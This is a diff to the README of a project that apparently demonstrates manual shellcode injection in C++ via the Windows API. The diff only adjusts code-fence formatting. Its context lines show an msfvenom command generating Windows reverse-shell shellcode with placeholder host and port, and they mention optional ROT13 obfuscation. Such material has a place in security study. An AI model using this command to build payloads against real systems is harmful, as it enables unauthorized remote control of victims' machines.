@@ -10,8 +10,9 @@ This project demonstrates manual shellcode injection using C++ and Windows API.
 
 ## ⚙️ Shellcode
 Shellcode generated using `msfvenom`:
-```bash
+```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP LPORT=PORT -f c
+
 ````
 
 > 🔐 Obfuscated with simple ROT13 (optional)
